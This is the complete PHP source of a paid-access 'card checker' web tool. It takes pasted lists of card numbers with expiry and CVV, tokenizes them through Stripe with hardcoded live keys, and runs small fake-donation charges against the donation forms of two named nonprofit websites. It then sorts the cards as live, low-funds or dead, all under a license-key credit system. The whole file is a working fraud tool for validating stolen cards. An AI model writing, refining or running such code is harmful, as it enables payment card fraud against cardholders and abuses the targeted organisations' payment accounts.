<?php
session_start();
error_reporting(0);
$key_file = 'keys.json';

function get_keys() {
    global $key_file;
    if (!file_exists($key_file)) return [];
    return json_decode(file_get_contents($key_file), true) ?: [];
}

function save_keys($keys) {
    global $key_file;
    file_put_contents($key_file, json_encode($keys, JSON_PRETTY_PRINT));
}

if (isset($_GET['logout'])) {
    $all_keys = get_keys();
    $ckey = $_SESSION['user_key'];
    if (isset($all_keys[$ckey])) {
        $all_keys[$ckey]['session_id'] = "";
        save_keys($all_keys);
    }
    session_destroy();
    header("Location: index.php");
    exit;
}

if (isset($_POST['login_key'])) {
    $input_key = trim($_POST['key']);
    $all_keys = get_keys();
    if (isset($all_keys[$input_key])) {
        if (date('Y-m-d') > $all_keys[$input_key]['expiry']) { $error = "Key Expired!"; }
        elseif ($all_keys[$input_key]['credits'] < 5) { $error = "Insufficient Credits!"; }
        elseif (!empty($all_keys[$input_key]['session_id']) && $all_keys[$input_key]['session_id'] !== session_id()) { $error = "Key in use on another device!"; }
        else {
            $all_keys[$input_key]['session_id'] = session_id();
            save_keys($all_keys);
            $_SESSION['user_key'] = $input_key;
            $_SESSION['logged_in'] = true;
        }
    } else { $error = "Invalid License Key!"; }
}

if (isset($_SESSION['logged_in'])) {
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    if (!isset($all_keys[$ckey]) || date('Y-m-d') > $all_keys[$ckey]['expiry'] || $all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
        session_destroy();
        header("Location: index.php");
        exit;
    }
}

if (!isset($_SESSION['logged_in'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - HEYOz</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { margin: 0; padding: 0; background: #080a0f; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-card { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 350px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .logo-icon { font-size: 50px; color: #58a6ff; margin-bottom: 20px; }
        h2 { color: #fff; margin-bottom: 25px; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(1, 4, 9, 0.5); border: 1px solid #30363d; color: #58a6ff; border-radius: 12px; box-sizing: border-box; text-align: center; outline: none; }
        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: 600; }
        .err { color: #f85149; margin-bottom: 15px; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body><div class="login-card"><div class="logo-icon"><i class="fa-solid fa-bolt-lightning"></i></div><h2>🔑 HEYOz LOGIN</h2>
<?php if($error) echo "<div class='err'>$error</div>"; ?>
<form method="POST"><input type="text" name="key" placeholder="ENTER YOUR KEY" required><button type="submit" name="login_key">ACTIVATE SYSTEM</button></form>
</div></body></html>
<?php exit; }

// --- Server-Side API logic ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
    header("Content-Type: application/json");
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    
    $data = json_decode(file_get_contents('php://input'), true);
    $ccx = trim($data['card'] ?? "");
    $gate = $data['gate'] ?? "gate1";

    // Card Parsing
    $parts = explode("|", $ccx);
    $n = $parts[0]; $mm = $parts[1]; $yy = $parts[2]; $cvc = $parts[3];
    if(strlen($yy) == 4) $yy = substr($yy, 2);

    // BIN Info
    $bin = substr($n, 0, 6);
    $ch_bin = curl_init("https://lookup.binlist.net/".$bin);
    curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
    $bin_res = json_decode(curl_exec($ch_bin), true);
    $brand = strtoupper($bin_res['scheme'] ?? 'UNK');
    $bank = $bin_res['bank']['name'] ?? 'Unknown Bank';
    $country = $bin_res['country']['emoji'] ?? '🏳️';
    $bin_info = "[$brand - $bank $country]";

    $email = 'jhsha'.rand(1,4).rand(1,99).'@gmail.com';
    $ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36';

    // Step 1: Payment Method
    if($gate == "gate1") {
        $pk = 'pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9';
    } else {
        $pk = 'pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS';
    }

    $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card', 'card[number]' => $n, 'card[cvc]' => $cvc, 'card[exp_month]' => $mm, 'card[exp_year]' => $yy, 'key' => $pk
    ]));
    $res1 = json_decode(curl_exec($ch1), true);
    $pm = $res1['id'];

    if (!$pm) {
        $err = $res1['error']['message'] ?? "Tokenization Restricted";
        echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info"]); exit;
    }

    // Step 2: Charge
    if ($gate == "gate1") {
        $target = 'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php';
        $fields = [
            'action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'Dmv', 'wpfs-custom-amount-unique' => '0.52',
            'wpfs-card-holder-email' => $email, 'wpfs-card-holder-name' => 'John Steve', 'wpfs-stripe-payment-method-id' => $pm
        ];
    } else {
        $target = 'https://www.massairspace.org/wp-admin/admin-ajax.php';
        $fields = [
            'action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'inline-donations', 'wpfs-custom-amount-unique' => '0.6',
            'wpfs-billing-name' => 'John Steve', 'wpfs-billing-address-country' => 'US', 'wpfs-card-holder-email' => $email, 'wpfs-stripe-payment-method-id' => $pm
        ];
    }

    $ch2 = curl_init($target);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
    $res2 = json_decode(curl_exec($ch2), true);
    $msg = $res2['message'] ?? "No Response";

    if (stripos($msg, "Successful") !== false || stripos($msg, "thank you") !== false) { 
        $st = "LIVE"; $m = "CHARGED 🔥"; 
        $all_keys = get_keys();
        $all_keys[$ckey]['credits'] -= 5;
        save_keys($all_keys);
    }
    elseif (stripos($msg, "insufficient") !== false) { $st = "INSUF"; $m = "LOW FUNDS 💰"; }
    elseif (stripos($msg, "action") !== false || stripos($msg, "authentication") !== false) { $st = "CVV"; $m = "3Ds/CCN 🛡️"; }
    else { $st = "DEAD"; $m = $msg; }

    $rem_c = get_keys()[$ckey]['credits'];
    echo json_encode(["status" => $st, "msg" => "$m (Credits: $rem_c) $bin_info"]); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ HEYOz PREMIUM CHECKER ⚡</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --accent: #58a6ff; }
        body { background: #080a0f; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 850px; animation: fadeIn 0.8s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .header-flex { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(90deg, #161b22, #0d1117); padding: 15px 20px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 20px; }
        h1 { font-size: 1.4rem; color: var(--accent); margin: 0; text-transform: uppercase; }
        .credit-display { color: var(--accent); font-weight: bold; border: 1px solid rgba(88, 166, 255, 0.3); padding: 8px 18px; border-radius: 12px; font-size: 14px; background: rgba(88, 166, 255, 0.1); }
        #status-display { background: #010409; border: 1px solid var(--accent); padding: 12px; border-radius: 12px; text-align: center; margin-bottom: 15px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; }
        .gate-select { width: 100%; background: var(--card); color: var(--accent); border: 1px solid var(--border); padding: 12px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; outline: none; }
        textarea { width: 100%; height: 160px; background: #010409; color: var(--accent); border: 1px solid var(--border); padding: 15px; border-radius: 12px; font-family: monospace; resize: none; outline: none; }
        .controls { display: flex; gap: 12px; margin: 20px 0; }
        #btn { flex: 2; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; }
        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; }
        .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-box { background: var(--card); border: 1px solid var(--border); padding: 12px; border-radius: 15px; text-align: center; }
        .stat-box small { font-size: 10px; color: #8b949e; text-transform: uppercase; display: block; margin-bottom: 5px; }
        .stat-box span { font-size: 20px; font-weight: bold; }
        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 12px; overflow: hidden; }
        .res-head { padding: 14px 18px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); }
        .res-body { display: none; padding: 10px; font-family: monospace; font-size: 12px; border-top: 1px solid var(--border); background: #0d1117; max-height: 250px; overflow-y: auto; }
        .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header-flex">
        <h1><i class="fa-solid fa-fire-glow"></i> HEYOz Checker</h1>
        <div class="credit-display"><i class="fa-solid fa-coins"></i> CREDITS: <?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></div>
    </div>
    <div id="status-display"><i class="fa-solid fa-satellite-dish"></i> SYSTEM READY</div>
    <select id="gate" class="gate-select">
        <option value="gate1">⚡ GATE 1: STRIPE $0.52 ( Mauritanian )</option>
        <option value="gate2">⚡ GATE 2: STRIPE $0.60 ( MassAirspace )</option>
    </select>
    <textarea id="list" placeholder="CC|MM|YY|CVV"></textarea>
    <div class="controls">
        <button id="btn" onclick="start()"><i class="fa-solid fa-play"></i> START CHECKING</button>
        <button id="stopBtn" onclick="stop()"><i class="fa-solid fa-stop"></i> STOP</button>
    </div>
    <div class="stats">
        <div class="stat-box"><small>Total</small><span id="c_total">0</span></div>
        <div class="stat-box"><small class="LIVE">Hit</small><span id="c_live" class="LIVE">0</span></div>
        <div class="stat-box"><small class="INSUF">Insuf</small><span id="c_insuf" class="INSUF">0</span></div>
        <div class="stat-box"><small class="CVV">3Ds</small><span id="c_cvv" class="CVV">0</span></div>
        <div class="stat-box"><small class="DEAD">Dead</small><span id="c_dead" class="DEAD">0</span></div>
    </div>
    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live')"><span><i class="fa-solid fa-circle-check"></i> HIT / CHARGED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_live"></div></div>
    <div class="result-box"><div class="res-head" style="color:#f85149" onclick="toggleBox('l_dead')"><span><i class="fa-solid fa-circle-xmark"></i> DECLINED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_dead"></div></div>
</div>
<script>
    let counts = { LIVE: 0, INSUF: 0, CVV: 0, DEAD: 0 };
    let isRunning = false;
    function toggleBox(id) { let b = document.getElementById(id); b.style.display = b.style.display === "block" ? "none" : "block"; }
    function stop() { isRunning = false; document.getElementById('stopBtn').style.display = 'none'; document.getElementById('btn').disabled = false; }
    async function start() {
        const textArea = document.getElementById('list');
        const statusBox = document.getElementById('status-display');
        let lines = textArea.value.split('\n').filter(l => l.trim() !== "");
        if (lines.length === 0) return;
        document.getElementById('c_total').innerText = lines.length;
        isRunning = true;
        document.getElementById('btn').disabled = true;
        document.getElementById('stopBtn').style.display = 'block';
        while (lines.length > 0 && isRunning) {
            let line = lines[0].trim();
            statusBox.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking: ' + line;
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    body: JSON.stringify({ card: line, gate: document.getElementById('gate').value }),
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                if (data.status === "LOGOUT") { window.location.reload(); return; }
                counts[data.status]++;
                if(document.getElementById('c_' + data.status.toLowerCase())) { document.getElementById('c_' + data.status.toLowerCase()).innerText = counts[data.status]; }
                const targetId = (data.status === "LIVE" || data.status === "INSUF" || data.status === "CVV") ? 'l_live' : 'l_dead';
                const target = document.getElementById(targetId);
                const item = document.createElement('div');
                item.style.padding = "8px 0"; item.style.borderBottom = "1px solid #21262d";
                item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} -> <span class="${data.status}">${data.msg}</span>`;
                target.insertBefore(item, target.firstChild);
                if(data.status === "LIVE") { location.reload(); }
                lines.shift();
                textArea.value = lines.join('\n');
                await new Promise(r => setTimeout(r, 600)); 
            } catch (e) { isRunning = false; }
        }
        stop();
        statusBox.innerHTML = '<i class="fa-solid fa-circle-check"></i> CHECKING FINISHED.';
    }
</script>
</body>
</html>
